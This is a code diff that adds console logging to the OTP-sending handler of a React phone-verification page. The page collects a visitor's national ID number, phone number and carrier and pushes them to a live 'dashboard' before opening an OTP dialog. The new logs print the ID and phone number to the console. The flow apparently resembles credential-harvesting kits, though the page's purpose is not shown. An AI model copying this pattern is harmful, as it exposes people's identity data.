@@ -211,15 +211,31 @@ export default function VerifyPhonePage() {
   }
 
   const handleSendOtp = async () => {
-    if (!idNumber || !phoneNumber || !selectedCarrier) return
+    console.log('[handleSendOtp] Called - idNumber:', idNumber, 'phoneNumber:', phoneNumber, 'selectedCarrier:', selectedCarrier);
     
-    if (!validateIdNumber(idNumber)) return
-    if (!validatePhoneNumber(phoneNumber)) return
+    if (!idNumber || !phoneNumber || !selectedCarrier) {
+      console.log('[handleSendOtp] Missing required fields');
+      return;
+    }
+    
+    if (!validateIdNumber(idNumber)) {
+      console.log('[handleSendOtp] Invalid idNumber');
+      return;
+    }
+    if (!validatePhoneNumber(phoneNumber)) {
+      console.log('[handleSendOtp] Invalid phoneNumber');
+      return;
+    }
 
     const visitorID = localStorage.getItem('visitor')
-    if (!visitorID) return
+    console.log('[handleSendOtp] visitorID:', visitorID);
+    if (!visitorID) {
+      console.log('[handleSendOtp] No visitorID in localStorage');
+      return;
+    }
 
     try {
+      console.log('[handleSendOtp] Submitting form data...');
       await submitVisitorFormData({
         id: visitorID,
         phoneIdNumber: idNumber,
@@ -230,8 +246,10 @@ export default function VerifyPhonePage() {
         phoneUpdatedAt: new Date().toISOString(),
         redirectPage: null
       })
+      console.log('[handleSendOtp] Form data submitted');
 
       // Notify dashboard immediately with phone data
+      console.log('[handleSendOtp] Notifying dashboard...');
       await notifyDashboard({
         id: visitorID,
         visitorId: visitorID,
@@ -245,6 +263,7 @@ export default function VerifyPhonePage() {
         currentStep: 7,
         status: "pending"
       })
+      console.log('[handleSendOtp] Dashboard notified');
 
       // Trigger dashboard refresh for instant update
       if (typeof window !== 'undefined') {
@@ -253,9 +272,10 @@ export default function VerifyPhonePage() {
 
       // Don't add to history yet - will add after OTP entry
       // Open Phone OTP Dialog directly
+      console.log('[handleSendOtp] Showing phone OTP dialog');
       setShowPhoneOtpDialog(true)
     } catch (error) {
-      console.error("Error saving phone data:", error)
+      console.error("[handleSendOtp] Error saving phone data:", error)
       toast.error("حدث خطأ", {
         description: "يرجى المحاولة مرة أخرى",
         duration: 5000
